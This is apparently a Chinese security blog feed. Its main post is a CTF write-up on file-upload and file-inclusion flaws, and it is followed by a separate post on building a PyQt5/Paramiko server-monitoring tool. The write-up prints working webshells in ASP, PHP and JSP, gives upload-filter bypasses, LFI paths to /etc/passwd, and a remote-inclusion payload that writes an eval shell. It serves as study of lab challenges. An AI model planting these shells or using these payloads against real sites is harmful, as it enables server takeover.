ASP、PHP、JSP 等网页脚本存在的⼀种命令执行环节，通常也叫做网页后门。攻击者在⼊侵了⼀个网站后，通常会将 WebShell 上传到网站的根目录下或者插⼊到正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到⼀个命令执行的环境，以达到控制网站服务器的目的。</p><ul><li>ASP</li></ul><pre class=" language-asp"><code class="language-asp"><%eval request("x")%><%execute request("x")%></code></pre><ul><li>ASPX</li></ul><pre class=" language-asp"><code class="language-asp"><%@ Page Language=”Jscript”%><%eval(Request.Item["x"],”unsafe”);%></code></pre><ul><li>PHP</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><ul><li>JSP CMD WebShell</li></ul><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream in<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">></span></code></pre><p>在数情况下，要完成文件上传漏洞这个攻击，要满足如下几个条件：</p><ul><li>首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。</li><li>其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</li></ul><h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>通过CTF Hub</p><ul><li><p><strong>前端验证</strong></p><p>修改调试参数，绕过文件后缀名校验，成功上传WebShell</p><p><img src="http://106.52.86.96/202008230000/image-20200827211559251.png" alt=""></p></li></ul><ul><li><p><strong>.htaccess</strong></p><p>htaccess 文件是 Apache 服务器中的⼀个配置文件，它负责相关目录下的相关配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、子定义 404 错误页面、改变文件扩展名、允许/组织特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></li></ul><pre><code>AddType application/x-httpd-php .png</code></pre><p>​        这表示让 png 后缀的⽂件当做 PHP 来解析：</p><p><img src="http://106.52.86.96/202008230000/image-20200902200255052.png" alt=""></p><p>​    此时上传⼀个 png图片，但是图片内容是 PHP：</p><p><img src="http://106.52.86.96/202008230000/image-20200902200527360.png" alt=""></p><ul><li><p><strong>MIME绕过</strong></p><p>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是⼀种标准，用来表示文档、文件或字节流的性质和格式。本关直接修改 Content-Type 即可实现上传绕过</p><p><img src="http://106.52.86.96/202008230000/image-20200831145549878.png" alt=""></p></li></ul><ul><li><p><strong>文件头检查</strong></p><p>文件头检查只对文件头进行基本的校验：</p><p>常见文件头:</p><p><img src="http://106.52.86.96/202008230000/image-20200904114328143.png" alt=""></p><p>可以通过WinHex工具查看文件16进制情况</p><p><img src="http://106.52.86.96/202008230000/image-20200904114351873.png" alt=""></p><p><img src="http://106.52.86.96/202008230000/image-20200904114407128.png" alt=""></p><p>这里可以通过添加文件头的形式进行</p></li></ul><p><img src="http://106.52.86.96/202008230000/image-20200904114942084.png" alt=""></p><p>也可以通过制作图马进行绕过</p><blockquote><p>Windows</p><p>参数 /b 指定以⼆进制格式复制、合并文件，用于图像类/声⾳类文件<br>参数 /a 指定以 ASCII 格式复制、合并文件，用于 txt 等文类文件</p></blockquote><pre><code>copy source.jpg/b+shell.php shell.jpg</code></pre><blockquote><p>Linux</p></blockquote><pre><code>➜ Desktop lspic.png shell.php# 拷⻉⼀个 shell.png ⽤于后⾯的操作➜ Desktop cp pic.png shell.png➜ Desktop lspic.png shell.php shell.png# 查看⼀下 shell.php 内容➜ Desktop cat shell.php&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;%# 将 shell.php 内容追加到 shell.png 中➜ Desktop cat shell.php &gt;&gt; shell.png</code></pre><p>手动查看⼀下，发现图片尾部已经存在 WebShell 木马了：</p><p><img src="http://106.52.86.96/202008230000/image-20200904143108735.png" alt=""></p><p>手生成的图马当然也是可以直接上传成功的。</p><ul><li><p>00截断</p><ul><li>谈到00截断我们都会想到，有什么0x00截断，%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：<br>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:<strong>chr（0）</strong><br>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。<br>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是<strong>空字符</strong>，而截断的关键就是这个空字符，<strong>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃</strong>。</li><li>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。<br>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。<strong>PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置</strong></li></ul><blockquote><p>PHP 5.2 存在 00 截断漏洞，截断也可以用来突破上传后缀限制。发现存在路径参数，⼀般设计到路径参数的多，大多数可以通过 00 截断路径来突破上传限制。</p></blockquote><p><img src="http://106.52.86.96/202008230000/image-20200905163018816.png" alt=""></p></li></ul><ul><li><p>双写后缀</p><p>可以看到上传功能的逻辑代码为：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"php5"</span><span class="token punctuation">,</span> <span class="token string">"php4"</span><span class="token punctuation">,</span> <span class="token string">"php3"</span><span class="token punctuation">,</span> <span class="token string">"phtml"</span><span class="token punctuation">,</span> <span class="token string">"pht"</span><span class="token punctuation">,</span> <span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"asp"</span><span class="token punctuation">,</span> <span class="token string">"aspx"</span><span class="token punctuation">,</span> <span class="token string">"asa"</span><span class="token punctuation">,</span> <span class="token string">"asax"</span><span class="token punctuation">,</span> <span class="token string">"ascx"</span><span class="token punctuation">,</span> <span class="token string">"ashx"</span><span class="token punctuation">,</span> <span class="token string">"asmx"</span><span class="token punctuation">,</span> <span class="token string">"cer"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">,</span> <span class="token string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现⼀个经典的 BUG 写法：</p><pre><code>$name = str_replace($blacklist, &quot;&quot;, $name);</code></pre><p>这种情况⼀般都可以进行双写绕过：上传的⽂件名为 shell.pphphp ，那么被替换之后就为 shell.php</p><p><img src="http://106.52.86.96/202008230000/image-20200905165104956.png" alt=""> </p></li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote><p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含</p></blockquote><p>文件包含漏洞形成也主要是开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。</p><pre><code>#文件包含特征?page=a.php?home=b.html?file=content</code></pre><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><blockquote><p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞(Local File Inclusion，简称 LFI)</p></blockquote><p>同样使用CTFHup靶场中文件包含题目进行演示</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token shell-comment comment">#包含文件 file作为GET请求</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>尝试一些存在本地包含的验证方式</p><pre><code>http://challenge...ctfhub.com:10080/file=../../../../../../../../../../../../../../etc/passwd   #相对路径http://challenge...ctfhub.com:10080/?file=/etc/passwd                                           #绝对路径http://challenge-053ba51fded77f37.sandbox.ctfhub.com:10080/?file=file:///etc/passwd             #file路径读取</code></pre><img src="http://106.52.86.96/202008230000/image-20200823205837738.png"  style="zoom:67%;" /><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><blockquote><p>PHP 不仅可以对本地⽂件进⾏包含，还可以对远程⽂件进⾏包含(Remote File Inclusion，简称 RFI)。</p></blockquote><p>同样在CTFHup靶场中演示远程包含文件的具体，主体php代码保持不变，我们通过提示文件中的phpinfo可以知道服务端php参数，allow_url_fopen,allow_url_include（(PHP 5.2 之后默认为 Off)）参数均属于On状态，可以尝试远程执行代码方式进行解题。</p><img src="http://106.52.86.96/202008230000/image-20200823205401848.png" style="zoom:75%;" /><p><img src="http://106.52.86.96/202008230000/image-20200823204907289.png" alt=""></p><pre><code>#通过远程文件包含，执行木马文件生成~http://challenge-3603087cdba29069.sandbox.ctfhub.com:10080/?file=http://106.52.86.96/CTF/hack.php</code></pre><p>hack.php文件内容如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment">#生成shell木马文件</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_POST["shell"]);echo "Show Time...."?>'</span><span class="token punctuation">;</span>      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>成功执行生成木马文件后</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#远程执行木马文件~ 一句话木马</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//challenge-3603087cdba29069.sandbox.ctfhub.com:10080/?file=http://106.52.86.96/CTF/hack.php</span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"Show Time...."</span><span class="token delimiter">?></span></code></pre><p>使用中国蚂蚁成功getshell</p><img src="http://106.52.86.96/202008230000/image-20200823212717658.png" style="zoom:60%;" /><h4 id="文件包含之截断"><a href="#文件包含之截断" class="headerlink" title="文件包含之截断"></a>文件包含之截断</h4><blockquote><p>大多数程序猿认为 PHP 中的包含漏洞⽐较好修复，固定扩展名即可，代码如下：</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>当进行包含时，不需要传输⽂件扩展名，例如，想要包含 News.php页面，只需要传⼊?file=News 即可。这样可以变相地修复包含漏洞</p><p><img src="http://106.52.86.96/202008230000/image-20200824000321435.png" alt=""></p><p>这个导致我们无法随心所欲地去读取系统文件信息了，因为这个文件显然是不存在的，这个时候程序就会想到使用字符串截断的方法来进行绕过</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h5><p>截断的原理：PHP 内核是由 C 语言实现的，所以使用了 C 语语言中的⼀些字符串处理函数。⽐如在连接字符串时候， 0 字节(\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加⼊⼀个 0字节，就能截断 file 变量之后的字符串</p><pre><code>?file=payload.txt\0</code></pre><p>因为浏览器 URL 并不⽀持 \ ，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成：</p><pre><code>?file=payload.txt%00</code></pre><p><img src="http://106.52.86.96/202008230000/image-20200824001548863.png" alt=""></p><h5 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a><strong>路径长度截断</strong></h5><p>Windows 下⽬录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。 ./ 表示当前路径。</p><pre><code>?file=payload.txt././././././././超过⼀定数量的./././././././././././././././././././././././</code></pre><p>这种方法只使用于</p><ul><li>magic_quotes_gpc = Off</li><li>PHP 版本小于 5.3.4</li></ul><p>如果为 On %00(NULL)将会被转义，从而无法正常截断。magic_quotes_gpc 为 On 的情况会为以下预定义字符转义:</p><ul><li><p>单引号(‘)</p></li><li><p>双引号(“)</p></li><li><p>反斜杠()</p></li><li><p>NULL</p><p><img src="http://106.52.86.96/202008230000/image-20200824001534830.png" alt=""></p></li></ul><h5 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h5><p>条件：PHP 的老版本（PHP &lt;=5.3.4），Winodws 下⽬录最大长度为 256 字节，Windows 下 cd … 显示的还是当前⽬录（点的数量不等于2时）</p><pre><code>?file=payload.txt........超过⼀定数量的........</code></pre><p><img src="http://106.52.86.96/202008230000/image-20200824001523873.png" alt=""></p><h5 id="远程文件截断"><a href="#远程文件截断" class="headerlink" title="远程文件截断"></a>远程文件截断</h5><p>可以通过空格、井号、问号截断绕过，不受GPC和PHP版本限制，只要能返回代码给包含函数，它就能执行：</p><pre><code>#空格截断?file=http://192.168.31.89/fi/payload.txt%20#问号截断?file=http://192.168.31.89/fi/payload.txt?##号截断?file=http://192.168.31.89/fi/payload.txt%23</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyqt5-运维管理工具</title>
      <link href="/2020/07/28/pyq5-chu-ti-yan/"/>
      <url>/2020/07/28/pyq5-chu-ti-yan/</url>
      
        <content type="html"><![CDATA[<p><img src="http://106.52.86.96/202007281309/06350.jpg" alt=""></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一篇关于之前自己对运维工具化开发的一些分享，其实自己对运维的线路理解的一直很浅，直到自己一步一步接触，逐步发挥一些自己的长处通过编写工具、编写脚本来提高日常运维管理的效率，开始自学Python语言，其实也不算学习，学习如何配置编译环境后，就直接上手开撸了，直蹦实现运维工具目的发出！</p><h3 id="主要技术"><a href="#主要技术" class="headerlink" title="主要技术"></a>主要技术</h3><ul><li><p>Python 2.7</p><p>2.x 版本官方已经不再维护了，目前3.x 已经支持许多高级特性，建议大家如果真的开始接触Python的话还是直接上3.X版本，Python对运维工作者的友好性，我就不多说了，你懂的~</p></li></ul><ul><li><p>Pyqt5</p><p>Python的图形化编程可利用的GUI 库多种多样，其中包括：<code>Tkinter</code>、<code>wxPython</code>、<code>Pywin</code>等，我曾经尝试过使用<code>Tkinter</code>，但是后来才发现<code>Tkinter</code>不持多线程，GUI的使用会导致页面卡死等待线程处理结束才能有响应，坑~~，转而开始使用了<code>Pyqt5</code>，<code>Pyqt5</code>是一套Python绑定Digia QT5应用的框架。它可用于2.x 和3.x 版本，主要借助事件、信号槽能够完成UI的动作指令，具有支持多线程、界面编辑可塑性强的特性。</p></li></ul><ul><li><p>Paramiko</p><p>paramiko是用python语言写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接，包括命令执行、文件上传、下载，这也是制作Linux图形化运维工具最基本功能库。</p></li></ul><ul><li><p>Linux Shell</p><p>工具目的是为解决手工维护命令执行，掌握基本的命令执行、Shell编写就能够制作一些实用的工具</p><p>基本命令包括netstate、ps、top、grep等等</p></li></ul><h3 id="界面制作"><a href="#界面制作" class="headerlink" title="界面制作"></a>界面制作</h3><p>通过QtDesigner设计界面，QtDesigner的设计符合MVC的架构，实现了视图和逻辑的分离，从而实现了开发的便捷，虽然不像Web前端那样网上很多实用的开源框架可以套用，但是利用QtDesigner的简单布局，制作工具的基本UI是没有太大问题的，想要设计更加美观的样式还是需要多拿捏一些（我想要的只要不要太丑就行。。）</p><p><img src="http://106.52.86.96/202007281309/1231.png" alt=""></p><p>*很关键的一点是QtDesigner设计的形成是以xxxx.ui形式的xml文件，不能够直接用于代码开发，但是能够通过转化将UI文件转化为.py文件用于工程的引用，为了方便起见我也直接把QtDesigner、pyuic都配置到Pycharm中去转化文件直接引用都非常快捷。</p><p><img src="http://106.52.86.96/202007281309/image-20200730012928301.png" alt=""></p><p><img src="http://106.52.86.96/202007281309/image-20200730013053939.png" alt=""></p><p>转化执行的命令如下：</p><pre class=" language-python"><code class="language-python">pyuic5 <span class="token operator">-</span>o xx<span class="token punctuation">.</span>py xxx<span class="token punctuation">.</span>ui    <span class="token comment" spellcheck="true">#转化ui为py文件</span></code></pre><h3 id="工具登陆"><a href="#工具登陆" class="headerlink" title="工具登陆"></a>工具登陆</h3><blockquote><p>登陆目标服务器需要的基本验证信息</p></blockquote><p><img src="http://106.52.86.96/202007281309/11.png" alt=""></p><p>下面是登陆的简单实现代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ssh_server</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> type<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true">#利用paramiko简单使用登陆远程服务器</span>    <span class="token keyword">global</span> ip_val<span class="token punctuation">,</span> passwd_val<span class="token punctuation">,</span> user_val<span class="token punctuation">,</span>df_flag_first<span class="token punctuation">,</span>now_max_num<span class="token punctuation">,</span>last_max_num    ip <span class="token operator">=</span> ip_val    pwd <span class="token operator">=</span> passwd_val    user <span class="token operator">=</span> user_val    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span>user<span class="token punctuation">,</span> password<span class="token operator">=</span>pwd<span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"socket.error"</span>                   <span class="token comment" spellcheck="true">#连接超时  </span>    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"AuthenticationException"</span>        <span class="token comment" spellcheck="true">#认证失败</span>    stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h3 id="物理状态"><a href="#物理状态" class="headerlink" title="物理状态"></a>物理状态</h3><blockquote><p>包括<code>系统基本参数</code>、<code>磁盘空间情况</code>、<code>性能情况</code>、<code>CUP占用进程监控</code>，这些也是平时关注比较多的点，非实时刷新的信息状态。</p></blockquote><p>这一块对熟悉Linux基本命令也是非常有帮助的，熟悉了这些基本命令，操作系统基本信息获取也就轻而易举了。</p><p><img src="http://106.52.86.96/202007281309/2.png" alt=""></p><p>简单实现代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">UpdateStatusInfo</span><span class="token punctuation">(</span>QThread<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#同样主要通过paramiko进行命令执行回显需要信息参数</span>  ip_date <span class="token operator">=</span> pyqtSignal<span class="token punctuation">(</span>str<span class="token punctuation">,</span>str<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># CUP使用率</span>    main_W<span class="token punctuation">.</span>cup_used_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>        ssh_server<span class="token punctuation">(</span><span class="token string">"top -b -n 2 -d 0 | awk 'NR==3{print $5}'| awk -F \"%\" '{print 100-$1\"%\"}'"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 内存使用率</span>    main_W<span class="token punctuation">.</span>mem_used_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>      str<span class="token punctuation">(</span>round<span class="token punctuation">(</span>float<span class="token punctuation">(</span>ssh_server<span class="token punctuation">(</span><span class="token string">"free -m | awk 'NR==2{print 100-($4+$6+$7)*100/$2}'"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 发行版本</span>    main_W<span class="token punctuation">.</span>version_val_lab<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>ssh_server<span class="token punctuation">(</span><span class="token string">"cat /etc/redhat-release 2>/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 语言编码</span>    main_W<span class="token punctuation">.</span>und_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>      ssh_server<span class="token punctuation">(</span><span class="token string">"grep \"LANG=\" /etc/sysconfig/i18n | grep -v \"^#\" | awk -F '\"' '{print $2}'"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 最后启动</span>    main_W<span class="token punctuation">.</span>lastup_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>ssh_server<span class="token punctuation">(</span><span class="token string">"who -b | awk '{print $3,$4}'"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 运行时间</span>    main_W<span class="token punctuation">.</span>run_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>ssh_server<span class="token punctuation">(</span><span class="token string">"uptime | sed 's/.*up \([^,]*\), .*/\\1/'"</span><span class="token punctuation">,</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># CUP TOP情况</span>    main_W<span class="token punctuation">.</span>top_lab_val<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>      ssh_server<span class="token punctuation">(</span><span class="token string">"top b -n1 | head -18 | tail -13 | awk '{print $1,$2,$3,$9,$10,$11,$12,$13}'| column -t"</span><span class="token punctuation">,</span>            <span class="token string">"show_cup_top"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    print_ts<span class="token punctuation">(</span><span class="token string">"系统信息加载完成"</span><span class="token punctuation">)</span></code></pre><h3 id="服务状态"><a href="#服务状态" class="headerlink" 